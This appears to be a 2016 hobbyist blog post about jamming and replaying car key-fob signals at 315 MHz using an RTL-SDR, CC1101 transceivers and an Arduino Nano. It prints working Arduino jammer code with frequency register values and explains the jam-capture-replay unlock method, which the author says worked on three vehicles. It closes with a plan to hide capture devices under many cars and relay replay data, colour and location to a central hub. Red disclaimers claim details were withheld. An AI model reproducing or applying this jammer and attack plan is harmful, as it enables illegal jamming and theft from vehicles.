---
layout:     post
title:      "Using RTL-SDR to Open Car Doors"
#subtitle:   "Pentesting"
date:       2016-06-08
author:     "Tech"
header-img: "img/post-rtl.jpg"
tags:
    - Reverse Engineering
    - Programming
    - Hardware
---


###### <span style="color: #ff0000;">Must note that using a jammer within USA is illegal. This post been changed to exclude any infomation on how to **successfully carry out the attack,  it will show the bases used but will not go in-depth. Thank you for understanding.</span>

In the years of 2014-2016, “Car Hacking” has been prevalent in todays society. Article after article, it became known that the automotive industry have plenty of worked lined up for them. In this blog post, I’ll familiarize you with a proof of concept I been working on. The use of a mesh network to attack against key entry systems using a few cheap parts.


# Software-defined Radio

> **Software-defined radio** (**SDR**) is a radio system where components that have been typically implemented in hardware (e.g. mixers, filters, amplifiers, modulators/demodulators, detectors, etc.) are instead implemented by means of software on a personal computer or embedded system. While the concept of SDR is not new, the rapidly evolving capabilities of digital electronics render practical many processes which used to be only theoretically possible.

These devices can get very pricey, specifically the HackRF One / BladeRF. If your focus on building the best device at the lowest price possible, the RTL2832U is the one to go with. Tons of them all over Ebay for around $15 USD.

![rtl-sdr2](/img/in-post/post-js-version/rtl-1.jpg)

> This is my cheap RTL2832U RTL-SDR “Tv Tuner” with antenna that I used for this project.

![rftransceiver](/img/in-post/post-js-version/rtl-2.jpg)

> Here is another one, that I didn’t end up using. The GPS Module in the back, I did use!

Using the orginal RTL and pair that with HDSDR software on linux, First wanted too see the key press in real time..

![keypress1](/img/in-post/post-js-version/rtl-3.jpg)

> As you see here, BMW the car manufacture uses the bands 315mhz. Those red lines going across the screen are from when I pressed the button on the remote.

When the victim walks to their car and press the unlock button, it sends that signal to the car and the doors get unlocked. We’ll need to jam the whole transaction before any of that occurs.


# Time to Build a Jammer

For this section, went on ebay and bought some CC1101 Wireless RF Transceivers, we will use these to intercept and replay attack using ardunio nano board.

![transmitters2](/img/in-post/post-js-version/rtl-4.jpg)

> Here we have two CC1101 transceivers connected to a arduino nano, the nano can be easily be powered by any cellphone and block a radius of 10m depending on strength.

Without getting to technical, I modified the panstamp library to work with 315Mhz. The orginal library had 433Mhz, 868Mhz, and 915Mhz, but not the one we needed, 315Mhz. I needed to figure out the highbyte, middlebyte, and lowbyte for the 315Mhz spectrum.

![freqformula](/img/in-post/post-js-version/rtl-6.png)

> Low, middle and high are three registers whose values can change the operating frequency. I got the values of 12:29:137 to use.

<span style="color: #ff0000;"> Must note that using a jammer within USA is illegal. This post been changed to exclude any infomation on how to **successfully carry out the attack,  it will show the bases used but will not go in-depth. Thank you for understanding.</span>

```c
#include "EEPROM.h"
#include "cc1101.h"

CC1101 cc1101;

// The LED is wired to the Arduino Output 4 (physical panStamp pin 19)
#define LEDOUTPUT 7

// counter to get increment in each loop
byte counter;
byte b;
byte syncWord = 199;

void blinker(){
//digitalWrite(LEDOUTPUT, HIGH);
//delay(100);
//digitalWrite(LEDOUTPUT, LOW);
///delay(100);
}

void setup()
{
//Serial.begin(38400);
Serial.begin(9200);
Serial.println("start");


// reset the counter
counter=0;
Serial.println("initializing...");
// initialize the RF Chip
cc1101.init();

cc1101.setSyncWord(&syncWord, false);
cc1101.setCarrierFreq(CFREQ_315);
cc1101.disableAddressCheck();
//cc1101.setTxPowerAmp(PA_LowPower);

//Serial.print("CC1101_PARTNUM "); //cc1101=0
Serial.println(cc1101.readReg(CC1101_PARTNUM, CC1101_STATUS_REGISTER));
//Serial.print("CC1101_VERSION "); //cc1101=4
Serial.println(cc1101.readReg(CC1101_VERSION, CC1101_STATUS_REGISTER));
//Serial.print("CC1101_MARCSTATE ");
Serial.println(cc1101.readReg(CC1101_MARCSTATE, CC1101_STATUS_REGISTER) & 0x1f);
}

void send_data() {
CCPACKET data;
data.length=1000;

data.data[0]=10;
data.data[2]=1;
data.data[3]=1;
data.data[4]=0;
//cc1101.flushTxFifo ();
Serial.print(cc1101.readReg(CC1101_MARCSTATE, CC1101_STATUS_REGISTER));
if(cc1101.sendData(data)){
send_data();
}
}
void loop()
{
send_data();

}
```

> The above code is what I found in regards to using the cc1101, it’s not that great for what we need to do.

I first wanted to send a straight pulse signal that will block all other signals. Filling the data arrays filled with 1’s seem to do the trick.

```c
#include "EEPROM.h"
#include "cc1101.h"

CC1101 cc1101;
CCPACKET data;

void setup()
{
  // initialize the RF Chip
  cc1101.init();
  
  // For 315 MHz -> 0C1D8A
  // 0C1D8A gives 315000061.03515625 Hz
  
  cc1101.writeReg(CC1101_FREQ2,  0x0C); // Set Transmitter
  cc1101.writeReg(CC1101_FREQ1,  0X1D); // freq to
  cc1101.writeReg(CC1101_FREQ0,  0x8A); // 315 MHz
  
  data.length = 100;
  for(int a = 0; a < 100; a++) {
    data.data[a]= 1;              // Filling the data array
  }
  
}

void loop()
{
  cc1101.sendData(data);
}
```

![](/img/in-post/post-js-version/rtl-5.jpg)
When the victim press the unlock button, it is first jammed and that signal (we’ll call it signalX) is captured and saved, we’ll used GNURadio to isolate out the actually jamming signal we created from the original key fob signal (We’ll call this signalY). When the victim presses the unlock button again, signalX that we orginally saved is now being sent to the vehicle and signalY can now be replay at a later time to unlock that same vehicle. When the signal is capture, you’ll need to reverse engineer it to be sent back. I used GNURadio to receive and demodulate the original ASK signal into binary modulated waveform that I can than use for replay at a later time.

> Amplitude-shift keying (ASK) is a form of amplitude modulation that represents digital data as variations in the amplitude of a carrier wave. In an ASK system, the binary symbol 1 is represented by transmitting a fixed-amplitude carrier wave and fixed frequency for a bit duration of T seconds. If signal value 1 isn’t transmitted than the signal value of 0 will be.


# Does this system work?

yes, I tested this on two cars and a truck and successfully implemented the attack and door locks opened. Scary to think that anyone can spend less than a few dollars and be-able to grab my laptop if left in the open. But truthfully, its more scary to think that this can evolve into more than a stationary attack. The price of SDR is steadily falling and after that their will be no need for such custom hardware, it will be more easier.


# How can this evolve?

Been going over a proof of concept for this attack by the masses. I wrote up some diagrams that shows how this attack can be done to not just one car at a time, but hundreds at a time. I retracted from posting that outline online, but will give bullet points to such a system.

1. Buy using the capture device above (we’ll call this veh1), attach a magnet on it that can go underneath a vehicle where eyes can’t see.
2. When the adversary key fob signal is captured and demodulated, we want to send this signal over a mesh network.
3. Wifi/bluetooth isn’t going to be long enough to pull a signal, I used LoRa wireless communication, which can work up to 15 miles over low data rate.
4. veh1 connects to it’s central hub and will post it’s binary modulated waveform which is low data.
5. Building a packet-like network would be best, giving each device a name so you can build a system of these and know which car is which.
6. Data comes into hub: vehicle name, color, location, and data for replay attack
7. Place this on any car(s), and the central hub will be filled in a matter of minutes.
